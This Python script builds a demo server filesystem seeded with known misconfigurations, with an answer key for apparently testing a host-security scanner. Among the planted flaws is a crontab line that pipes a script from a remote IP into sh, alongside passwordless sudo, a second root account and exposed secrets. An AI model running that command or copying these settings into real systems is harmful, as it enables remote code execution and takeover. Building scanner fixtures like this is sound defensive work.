"""
Build a DEMO server image (a folder laid out like a Linux root filesystem) with
known, planted misconfigurations, for `aegis host --root <folder>`.

PLANTED_HOST is the answer key. File-permission findings (world-readable secrets,
world-writable code) can only be planted on a Linux/Unix filesystem, so they are
listed separately in PLANTED_HOST_POSIX.
"""
from __future__ import annotations

import os
import time

PLANTED_HOST = {
    "EXPOSED_DATABASE": 1, "EXPOSED_NOAUTH_STORE": 1, "EXPOSED_ADMIN_SERVICE": 2, "SECRET_IN_WEB_ROOT": 2,
    "RISKY_FILE_IN_WEB_ROOT": 1, "DEBUG_MODE_ON": 1, "EXTRA_ROOT_ACCOUNT": 1, "EMPTY_PASSWORD": 1,
    "SUDO_NOPASSWD": 1, "SSH_ROOT_LOGIN": 1, "SSH_PASSWORD_LOGIN": 1, "OS_OUT_OF_SUPPORT": 1, "REBOOT_PENDING": 1,
    "UPDATES_STALE": 1, "NO_AUTO_SECURITY_UPDATES": 1, "FIREWALL_DISABLED": 1, "SUSPICIOUS_SCHEDULED_TASK": 1,
    "WEB_SERVER_VERSION_LEAK": 1, "NO_HSTS": 1, "CLOCK_NOT_SYNCED": 1,
}
PLANTED_HOST_POSIX = {"SECRETS_WORLD_READABLE": 2, "APP_CODE_WORLD_WRITABLE": 1}


def _tcp4(ip: str, port: int) -> str:
    h = "".join(f"{int(o):02X}" for o in reversed(ip.split(".")))
    return f"{h}:{port:04X}"


def _tcp6_any(port: int) -> str:
    return "0" * 32 + f":{port:04X}"


def build(out: str) -> str:
    root = os.path.join(out, "demo-server")
    files: dict[str, str] = {}

    def put(path: str, text: str, mode: int | None = None) -> None:
        files[path] = text
        full = os.path.join(root, path.lstrip("/").replace("/", os.sep))
        os.makedirs(os.path.dirname(full), exist_ok=True)
        with open(full, "w", encoding="utf-8", newline="\n") as fh:
            fh.write(text)
        if mode is not None and os.name != "nt":
            os.chmod(full, mode)

    hdr = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"
    rows4 = [("0.0.0.0", 3306), ("0.0.0.0", 6379), ("127.0.0.1", 5432), ("0.0.0.0", 22), ("0.0.0.0", 443),
             ("0.0.0.0", 9000)]
    tcp = hdr + "".join(f"   {i}: {_tcp4(ip, p)} 00000000:0000 0A 00000000:00000000 00:00000000 00000000   0  0 1{i} 1\n"
                        for i, (ip, p) in enumerate(rows4))
    tcp += f"   9: {_tcp4('10.0.0.5', 51234)} {_tcp4('10.0.0.9', 3306)} 01 00000000:00000000 00:00000000 00000000 33 0 9 1\n"
    put("/proc/net/tcp", tcp)
    put("/proc/net/tcp6", hdr + "".join(
        f"   {i}: {_tcp6_any(p)} {'0' * 32}:0000 0A 00000000:00000000 00:00000000 00000000 0 0 2{i} 1\n"
        for i, p in enumerate([80, 2375])))

    put("/etc/hostname", "sb-prod-01\n")
    put("/etc/os-release", 'PRETTY_NAME="Ubuntu 20.04.6 LTS"\nNAME="Ubuntu"\nVERSION_ID="20.04"\nID=ubuntu\n')
    put("/etc/passwd", "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1::/usr/sbin:/usr/sbin/nologin\n"
                       "www-data:x:33:33::/var/www:/usr/sbin/nologin\ndeploy:x:1000:1000::/home/deploy:/bin/bash\n"
                       "toor:x:0:0::/root:/bin/bash\n")
    put("/etc/shadow", "root:$6$abc$hash:19000:0:99999:7:::\ndaemon:*:19000:0:99999:7:::\n"
                       "www-data:*:19000:0:99999:7:::\ndeploy::19000:0:99999:7:::\ntoor:$6$x$y:19000::::::\n")
    put("/etc/sudoers", "Defaults env_reset\nroot ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\n"
                        "# deploy ALL=(ALL) NOPASSWD: ALL   (commented out - must not count)\n")
    put("/etc/sudoers.d/90-deploy", "deploy ALL=(ALL) NOPASSWD:ALL\n")
    put("/etc/ssh/sshd_config", "Include /etc/ssh/sshd_config.d/*.conf\nPort 22\nPermitRootLogin yes\n"
                                "ChallengeResponseAuthentication no\nMatch User backup\n    PermitRootLogin no\n"
                                "    PasswordAuthentication no\n")
    put("/etc/ssh/sshd_config.d/50-cloud-init.conf", "PasswordAuthentication yes\n")
    put("/etc/ufw/ufw.conf", "# /etc/ufw/ufw.conf\nENABLED=no\nLOGLEVEL=low\n")
    put("/etc/crontab", "SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
    put("/etc/cron.d/sportsbook", "* * * * * www-data php /var/www/sportsbook/artisan schedule:run >> /dev/null 2>&1\n")
    put("/var/spool/cron/crontabs/www-data", "*/5 * * * * curl -fsSL http://45.9.148.3/x.sh | sh\n")
    put("/var/run/reboot-required", "*** System restart required ***\n")
    put("/var/run/reboot-required.pkgs", "linux-image-5.4.0-200-generic\nlibc6\n")
    put("/var/lib/apt/periodic/update-success-stamp", "")
    old = time.time() - 60 * 86400
    os.utime(os.path.join(root, "var", "lib", "apt", "periodic", "update-success-stamp"), (old, old))
    os.makedirs(os.path.join(root, "run", "systemd", "system"), exist_ok=True)

    put("/etc/nginx/nginx.conf", "user www-data;\nhttp {\n    include /etc/nginx/sites-enabled/*;\n}\n")
    put("/etc/nginx/sites-enabled/sportsbook", """server {
    listen 443 ssl http2;
    server_name sportsbook.example.co.ke;
    ssl_certificate /etc/letsencrypt/live/sportsbook/fullchain.pem;
    root /var/www/sportsbook/public;   # Laravel
    index index.php;
    location ~ \\.php$ { fastcgi_pass 127.0.0.1:9000; }
}
""")
    env = ("APP_NAME=Sportsbook\nAPP_ENV=production\nAPP_DEBUG=true\nAPP_KEY=base64:REDACTEDdemoREDACTED=\n"
           "DB_HOST=127.0.0.1\nDB_DATABASE=sportsbook\nDB_USERNAME=sb\nDB_PASSWORD=demo-not-real\n"
           "MPESA_CONSUMER_KEY=demo-key\nMPESA_CONSUMER_SECRET=demo-secret\nMPESA_PASSKEY=demo-passkey\n"
           "MPESA_SHORTCODE=600981\n")
    put("/var/www/sportsbook/.env", env, 0o644)
    put("/var/www/sportsbook/public/.env", env.replace("APP_DEBUG=true", "APP_DEBUG=false"), 0o644)
    put("/var/www/sportsbook/public/index.php", "<?php require __DIR__.'/../bootstrap/app.php';\n")
    put("/var/www/sportsbook/public/phpinfo.php", "<?php phpinfo();\n")
    put("/var/www/sportsbook/public/db_backup_2026-11-01.sql", "-- MySQL dump (demo)\n")
    put("/var/www/sportsbook/app/Services/Settlement.php", "<?php class Settlement { /* demo */ }\n", 0o666)
    put("/var/www/sportsbook/app/Services/MpesaCallback.php", "<?php class MpesaCallback { /* demo */ }\n", 0o644)
    put("/var/www/sportsbook/vendor/somepkg/.env", "DB_PASSWORD=ignored-vendor-dir\n")
    return root
